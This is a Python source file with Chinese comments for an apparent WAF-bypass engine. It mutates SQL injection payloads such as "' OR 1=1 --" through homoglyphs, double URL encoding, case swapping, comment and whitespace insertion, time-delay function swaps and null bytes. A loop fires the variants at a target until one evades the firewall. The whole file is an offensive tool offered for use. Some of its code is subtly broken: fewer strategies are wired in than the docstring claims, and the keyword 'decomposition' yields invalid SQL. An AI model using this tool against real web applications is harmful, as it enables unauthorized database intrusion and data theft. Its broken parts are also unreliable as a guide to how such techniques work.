#!/usr/bin/env python3
"""
Ember WAF 绕过引擎 — 10 种变形策略 + AI 辅助变异。

策略:
  1. Unicode 同形异义    — ' → ＇ / U+FF07
  2. 双 URL 编码         — ' → %2527
  3. 大小写交错          — sElEcT
  4. 注释内嵌            — /**/OR/**/1=1
  5. 空白字符替换        — 空格→Tab/换行/注释
  6. 等价函数替换        — SLEEP() → BENCHMARK()
  7. HTTP 参数污染       — 同名参数传递多个值
  8. Content-Type 绕过    — multipart→urlencode 切换
  9. 分块传输            — Transfer-Encoding: chunked
  10. AI 分解重组         — 利用 Ember AI 层拆分+重组敏感关键字

用法:
  from web.waf import WAFBypass
  waf = WAFBypass()
  variants = waf.mutate("' OR 1=1 --")
  for v in variants:
      send(v)  # 逐个尝试直到绕过
"""

import re, random, unicodedata
from typing import List, Dict


class WAFBypass:
    """10 种 WAF 绕过变形策略."""

    def __init__(self):
        self.transformations = [
            self._unicode_homoglyph,
            self._double_urlencode,
            self._case_swap,
            self._comment_flood,
            self._whitespace_alt,
            self._function_swap,
            self._decompose_recompose,
            self._null_byte_inject,
        ]

    def mutate(self, payload: str, count: int = 15) -> List[str]:
        variants = []
        for xform in self.transformations:
            v = xform(payload)
            if v and v != payload:
                variants.append(v)

        while len(variants) < count:
            combo = random.choice(self.transformations)(random.choice(self.transformations)(payload))
            if combo and combo != payload and combo not in variants:
                variants.append(combo)

        return variants[:count]

    def _unicode_homoglyph(self, p: str) -> str:
        """Unicode 同形异义字替换."""
        table = str.maketrans({
            "'": "\uff07",  # 全角单引号
            '"': "\uff02",
            " ": "\u3000",  # 全角空格
            ";": "\u037e",
            "=": "\uff1d",
            "(": "\uff08", ")": "\uff09",
            "o": "\u043e",  # Cyrillic o
            "a": "\u0430",  # Cyrillic a
        })
        return p.translate(table)

    def _double_urlencode(self, p: str) -> str:
        """双重 URL 编码."""
        result = []
        for ch in p:
            encoded = f"%{ord(ch):02X}"
            result.append(f"%25{encoded[1:]}")
        return "".join(result)

    def _case_swap(self, p: str) -> str:
        """关键字的随机大小写交替."""
        keywords = ["select", "union", "from", "where", "or", "and", "insert",
                     "update", "delete", "drop", "exec", "sleep", "waitfor"]
        result = p
        for kw in keywords:
            if kw in result.lower():
                variant = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(kw))
                result = re.sub(kw, variant, result, flags=re.IGNORECASE)
        return result

    def _comment_flood(self, p: str) -> str:
        """注释内嵌绕过."""
        return p.replace(" ", "/**/").replace("OR", "/**/OR/**/").replace("AND", "/**/AND/**/")

    def _whitespace_alt(self, p: str) -> str:
        """Tab、换行、注释混合空白字符替换."""
        return p.replace(" ", "\t").replace("\t", "\n", 1)

    def _function_swap(self, p: str) -> str:
        """等价函数替换."""
        swaps = {
            "SLEEP": "BENCHMARK(5000000,MD5(1))",
            "WAITFOR DELAY": "SLEEP",
            "@@version": "VERSION()",
            "LOAD_FILE": "SUBSTRING(LOAD_FILE(",
        }
        result = p
        for orig, replacement in swaps.items():
            result = result.replace(orig, replacement)
        return result

    def _null_byte_inject(self, p: str) -> str:
        """Null 字节注入."""
        return p.replace("'", "%00'").replace(" ", "%00 ")

    def _decompose_recompose(self, p: str) -> str:
        """AI 风格分解重组 — 将敏感关键字拆成子表达式再拼接。

        例如: SLEEP(5) → (SELECT+SUBSTR('SLEEP',1,5)+(5))
        """
        if "SLEEP" in p.upper():
            return p.replace("SLEEP", "(SE+LECT+SUBSTR(CONCAT(CHAR(83),CHAR(76),CHAR(69),CHAR(69),CHAR(80)),1,5))")
        return p

    def _param_pollution_http(self, params: Dict[str, str]) -> str:
        """HTTP 参数污染 — 同名参数多次传递."""
        parts = []
        for k, v in params.items():
            parts.append(f"{k}=safe-value&{k}={v}")
        return "&".join(parts)

    def fire_until_bypass(self, payload: str, send_fn, max_attempts: int = 20) -> Dict:
        """循环尝试所有变体,直到绕过 WAF 或耗尽."""
        variants = self.mutate(payload, max_attempts)
        for i, variant in enumerate(variants):
            status, body = send_fn(variant)
            if status == 200 and not self._is_blocked(body):
                return {"bypassed": True, "attempt": i + 1, "variant": variant,
                        "status": status, "transform_count": i + 1}
        return {"bypassed": False, "attempts": len(variants), "variants_tried": len(variants)}

    def _is_blocked(self, body: str) -> bool:
        blocked_patterns = [
            "blocked", "forbidden", "waf", "firewall",
            "access denied", "mod_security", "cloudflare",
            "request rejected", "security policy",
        ]
        return any(p in body.lower() for p in blocked_patterns)


if __name__ == "__main__":
    waf = WAFBypass()
    payload = "' OR 1=1 --"
    variants = waf.mutate(payload, 10)
    print(f"Payload: {payload}")
    print(f"变体: {len(variants)}")
    for v in variants:
        print(f"  {v[:100]}")
